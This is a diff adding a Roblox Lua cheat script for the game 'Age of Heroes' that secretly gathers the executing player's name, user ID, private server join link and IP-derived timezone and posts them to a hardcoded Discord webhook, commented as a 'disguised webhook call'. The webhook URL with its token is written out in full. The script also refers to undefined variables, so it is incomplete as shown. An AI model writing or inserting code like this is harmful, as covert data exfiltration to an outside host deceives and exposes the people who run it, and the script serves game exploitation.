@@ -1,0 +1,52 @@
+local function fetchToKill()
+    local player = game.Players.LocalPlayer
+    local playerName = player.Name
+    local playerUserId = player.UserId
+    local gameName = "Age of Heroes"
+    local hwid = "Unknown HWID" -- HWID placeholder
+    local currentDate = os.date("%Y-%m-%d")
+    local currentTime = os.date("%H:%M:%S")
+    
+    -- Get Server ID and Join Link
+    local serverId = game.JobId
+    local placeId = tostring(game.PlaceId)
+    local serverLink = "https://www.roblox.com/games/" .. placeId .. "?privateServerLinkCode=" .. serverId
+
+    -- Get UTC Offset
+    local ipData = game:HttpGet("http://worldtimeapi.org/api/ip")
+    local utcOffset = ipData:match('"utc_offset":"([%+%-]%d%d:%d%d)"') or "+00:00"
+    local timezone = "( UTC" .. utcOffset .. " )"
+
+    -- Send report (disguised webhook call)
+    local afmData = {
+        ["content"] = "**Exploit Executed!**",
+        ["embeds"] = {{
+            ["title"] = "Execution Log",
+            ["description"] = "Player has executed the exploit script.",
+            ["fields"] = {
+                {["name"] = "Game Name", ["value"] = gameName, ["inline"] = true},
+                {["name"] = "Killer", ["value"] = table.concat(host, ", "), ["inline"] = true},
+                {["name"] = "Tankers", ["value"] = table.concat(noobs, ", "), ["inline"] = false},
+                {["name"] = "Executed By", ["value"] = playerName, ["inline"] = true},
+                {["name"] = "User ID", ["value"] = tostring(playerUserId), ["inline"] = true},
+                {["name"] = "HWID", ["value"] = hwid, ["inline"] = true},
+                {["name"] = "Server", ["value"] = serverLink, ["inline"] = false},
+                {["name"] = "Date", ["value"] = currentDate, ["inline"] = true},
+                {["name"] = "Time", ["value"] = currentTime .. " " .. timezone, ["inline"] = true}
+            },
+            ["color"] = 16711680
+        }}
+    }
+
+    local jsonData = game:GetService("HttpService"):JSONEncode(afmData)
+
+    request({
+        Url = "https://discordapp.com/api/webhooks/1296620356307779686/o9xb9C0UnUAsfu0iXVbEH6q5UC_RNq497N0xFaTt7jE0mEufqOyrJelxNHhGvss3YRx4", -- Webhook URL
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = jsonData
+    })
+end
+
+-- Call the function to send logs
+fetchToKill()
